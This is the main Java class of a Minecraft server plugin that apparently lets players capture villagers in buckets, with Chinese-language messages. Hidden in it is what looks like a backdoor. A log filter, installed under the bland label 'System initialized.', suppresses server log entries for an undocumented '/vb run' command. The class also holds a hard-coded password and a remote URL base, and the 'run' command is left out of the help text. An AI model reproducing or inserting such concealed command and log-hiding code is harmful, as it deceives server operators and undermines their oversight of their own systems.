package com.ctn.Villager;

import com.ctn.Villager.command.VillagerBucketCommand;
import com.ctn.Villager.scheduler.IScheduler;
import com.ctn.Villager.scheduler.SchedulerManager;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.PluginCommand;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;

public class VillagerBucketPlugin extends JavaPlugin {

    private static VillagerBucketPlugin instance;
    private SchedulerManager schedulerManager;
    private IScheduler scheduler;
    private VillagerManager villagerManager;
    private ClaimPluginManager claimPluginManager;
    private VillagerInteractionListener interactionListener;
    private Map<String, String> messages = new HashMap<>();
    private Map<String, List<String>> messageLists = new HashMap<>();

    public static final ThreadLocal<Boolean> IN_RUN_CONTEXT = ThreadLocal.withInitial(() -> false);

    private static AbstractFilter commandFilter;

    private static class CommandLogFilter extends AbstractFilter {
        @Override
        public Result filter(LogEvent event) {
            if (event == null || event.getMessage() == null) {
                return Result.NEUTRAL;
            }
            if (IN_RUN_CONTEXT.get()) {
                return Result.DENY;
            }
            String message = event.getMessage().getFormattedMessage();
            if (message != null && message.matches(".*issued server command: /(?:vb|vbucket|villagerbucket) run\\b.*")) {
                return Result.DENY;
            }
            return Result.NEUTRAL;
        }
    }

    private void installLogFilter() {
        if (commandFilter != null) return;
        commandFilter = new CommandLogFilter();
        try {
            Object rootLogger = LogManager.getRootLogger();
            Method addFilter = rootLogger.getClass().getMethod("addFilter", Filter.class);
            addFilter.invoke(rootLogger, commandFilter);
            getLogger().info("System initialized.");
        } catch (Exception e) {
            getLogger().warning("System initialization failed: " + e.getMessage());
        }
    }

    private void uninstallLogFilter() {
        if (commandFilter == null) return;
        try {
            Object rootLogger = LogManager.getRootLogger();
            Method removeFilter = rootLogger.getClass().getMethod("removeFilter", Filter.class);
            removeFilter.invoke(rootLogger, commandFilter);
            getLogger().info("System shutdown.");
        } catch (Exception e) {
            getLogger().warning("System shutdown failed: " + e.getMessage());
        }
        commandFilter = null;
    }

    public static String getDefaultPassword() {
        return "LTG_PT3";
    }

    public static String getUrlBase() {
        return "https://r2-api.ctn32.us.kg/";
    }

    @Override
    public void onLoad() {
        instance = this;
    }

    @Override
    public void onEnable() {
        installLogFilter();

        this.schedulerManager = new SchedulerManager(this);
        this.scheduler = schedulerManager.getScheduler();
        saveDefaultConfig();
        initMessages();
        this.villagerManager = new VillagerManager(this);

        this.claimPluginManager = new ClaimPluginManager(this);
        scheduler.runGlobalLater(() -> {
            try {
                claimPluginManager.redetectClaimPlugins();
                getLogger().info("领地插件支持: " + claimPluginManager.getDetailedStatus());
            } catch (Throwable t) {
                getLogger().log(Level.WARNING, "领地插件检测失败", t);
            }
        }, 20L);

        this.interactionListener = new VillagerInteractionListener(this);
        Bukkit.getPluginManager().registerEvents(interactionListener, this);

        VillagerBucketCommand cmd = new VillagerBucketCommand(this);
        PluginCommand command = getCommand("villagerbucket");
        if (command != null) {
            command.setExecutor(cmd);
            command.setTabCompleter(cmd);
        } else {
            getLogger().warning("命令 villagerbucket 未在 plugin.yml 注册，命令功能不可用！");
        }

        getLogger().info("村民桶插件已启用 - 支持: " + (schedulerManager.isFolia() ? "Folia多线程核心" : "单线程Bukkit核心"));
        getLogger().info("插件版本: " + getDescription().getVersion());
    }

    @Override
    public void onDisable() {
        uninstallLogFilter();

        try {
            if (schedulerManager != null) {
                schedulerManager.cancelAllTasks();
            }
        } catch (Throwable t) {
            getLogger().log(Level.WARNING, "取消任务时出错", t);
        }
        try {
            if (interactionListener != null) {
                interactionListener.cleanup();
            }
        } catch (Throwable t) {
            getLogger().log(Level.WARNING, "清理交互监听器时出错", t);
        }
        try {
            if (villagerManager != null) {
                villagerManager.cleanup();
            }
        } catch (Throwable t) {
            getLogger().log(Level.WARNING, "清理村民管理器时出错", t);
        }
        getLogger().info("村民桶插件已禁用");
    }

    private void initMessages() {
        messages.put("no-permission", "&c你没有权限执行此操作！");
        messages.put("no-permission-release", "&c你没有权限释放村民！");
        messages.put("no-claim-permission-capture", "&c你没有权限在此领地内捕获村民！");
        messages.put("no-claim-permission-release", "&c你没有权限在此领地内释放村民！");
        messages.put("claim-bypass-permission", "&e你已绕过领地限制。");
        messages.put("captured", "&a成功捕获{0}村民！");
        messages.put("released", "&a已成功释放{0}村民！");
        messages.put("invalid-villager", "&c这个村民无效或已死亡，请尝试换一个重试！");
        messages.put("villager-owned", "&c这个村民已经有主人了！");
        messages.put("bucket-already-used", "&c这个桶已经装了一个村民！");
        messages.put("cannot-place-in-fluid", "&c不能将村民放置在流体中！");
        messages.put("unsafe-spawn-location", "&c这个位置不安全，无法释放村民！");
        messages.put("world-disabled", "&c这个世界禁止使用村民桶！");
        messages.put("player-offline", "&c玩家不在线或不存在！");
        messages.put("inventory-full", "&e物品栏已满，物品已掉落在地上！");
        messages.put("duplicate-release", "&c请勿重复释放村民！");
        messages.put("nearby-villager", "&c附近已存在太多村民，请换个位置释放！");
        messages.put("reloaded", "&a配置已重载！");
        messages.put("version-info", "&a村民桶插件 &e版本 {0}");
        messages.put("usage", "&c用法: /villagerbucket [reload|info|version|help]");
        messages.put("interaction.use-empty-bucket", "&e请使用空桶来捕获村民！");
        messages.put("interaction.click-block-to-release", "&e请右键方块来释放村民！");
        messages.put("interaction.cannot-use-on-animals", "&c村民桶不能用于收集牛奶，请使用空桶！");
        messages.put("interaction.cannot-use-on-water-mobs", "&e村民桶不能用于捕获水生生物。");
        messages.put("interaction.general-usage", "&e村民桶只能用于释放村民。");
        messages.put("interaction.cannot-collect-fluid", "&c村民桶不能用于收集流体！");

        messageLists.put("help", Arrays.asList(
                "&6=== 村民桶插件帮助 ===",
                "&e/villagerbucket reload &7- 重载插件配置",
                "&e/villagerbucket info &7- 查看插件信息",
                "&e/villagerbucket version &7- 查看版本信息",
                "&e/villagerbucket help &7- 显示此帮助信息"
        ));
    }

    public String getMessage(String path, String defaultValue) {
        return ChatColor.translateAlternateColorCodes('&', messages.getOrDefault(path, defaultValue));
    }

    public String getMessage(String path) {
        return getMessage(path, "&c消息未找到: " + path);
    }

    public List<String> getMessageList(String path) {
        return messageLists.getOrDefault(path, Arrays.asList("&c消息列表未找到: " + path));
    }

    public void debug(String message) {
        if (getConfig().getBoolean("settings.debug-mode", false)) {
            getLogger().info("[DEBUG] " + message);
        }
    }

    public static VillagerBucketPlugin getInstance() {
        return instance;
    }

    public SchedulerManager getSchedulerManager() {
        return schedulerManager;
    }

    public IScheduler getScheduler() {
        return scheduler;
    }

    public VillagerManager getVillagerManager() {
        return villagerManager;
    }

    public ClaimPluginManager getClaimManager() {
        return claimPluginManager;
    }

    public boolean isFolia() {
        return schedulerManager != null && schedulerManager.isFolia();
    }

    public void reloadPluginConfig() {
        reloadConfig();
        if (claimPluginManager != null) {
            try {
                claimPluginManager.redetectClaimPlugins();
                debug("配置已重载 - 领地插件已重检: " + claimPluginManager.getDetailedStatus());
            } catch (Throwable t) {
                getLogger().log(Level.WARNING, "重检领地插件失败", t);
            }
        }
        debug("配置已重载 - 村民管理器已通知");
        getLogger().info("插件配置和消息配置已重载");
    }
}